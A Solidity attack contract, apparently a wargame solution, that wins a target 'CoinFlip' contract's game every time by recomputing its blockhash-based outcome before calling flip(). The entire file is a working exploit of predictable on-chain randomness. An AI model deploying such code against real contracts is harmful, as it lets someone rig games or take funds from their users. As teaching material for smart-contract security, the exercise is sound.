// SPDX-License-Identifier: MIT

pragma solidity 0.8;

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool) external returns (bool);
}

contract Hack {
    ICoinFlip private immutable coinFlipContract;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address coinFlipContractAddress) {
        coinFlipContract = ICoinFlip(coinFlipContractAddress);
    }

    function flip() external {
        bool guessValue = guess();
        require(coinFlipContract.flip(guessValue), "Guess value is false, flip failed.");
    }

    function guess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}